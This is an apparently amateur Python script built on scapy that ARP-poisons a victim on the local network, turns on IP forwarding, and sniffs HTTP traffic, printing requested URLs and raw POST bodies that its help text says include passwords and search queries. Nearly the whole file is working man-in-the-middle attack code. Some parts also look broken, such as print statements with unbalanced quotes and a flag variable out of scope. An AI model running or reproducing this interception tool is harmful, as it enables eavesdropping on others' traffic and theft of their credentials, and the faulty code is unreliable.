from scapy.all import *
from scapy.layers.http import HTTPRequest
import sys
import os
import time
import argparse

from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
 
try:
    interface = "wlan0"
    victimIP = input("[*] Enter Victim IP: ")
    gateIP = "192.168.1.1"
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)
 
print("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
 
def reARP():
    print("\n[*] Restoring Targets...")
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)
 
def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
    #send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
    #send(IP(src=victimIP, dst=gateIP)/ICMP()/"Hello World")
    #send(IP(src=victimIP, dst=gateIP)/TCP(sport=80, dport=80), count=10000)

def sniff_packets(iface=None):
    """
    Sniff port 80 packets with 'iface'
    """
    if iface: # (http)
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
        # 'process_packet' is the callback
    else:
        sniff(filter="port 80", prn=process_packet, store=False)
        # default interface
       
def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print("\n{GREEN}[+] ", ip, "Requested ", url, " with ", method")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print("\n{RED}[*] Some useful Raw data: ", packet[Raw].load")
    
            
def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")     
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")     
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")    
    while 1:
        try:
            trick(gateMAC, victimMAC)
            parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                    + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
            parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
            parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
            args = parser.parse_args()
            iface = args.iface
            show_raw = args.show_raw
            sniff_packets(iface)
            time.sleep(60)
        except KeyboardInterrupt:
            reARP()
            break


mitm()
#parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                   # + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
#parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
#parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
# parse arguments
#mitm(parser)
#args = parser.parse_args()
#iface = args.iface
#show_raw = args.show_raw
#sniff_packets(iface)


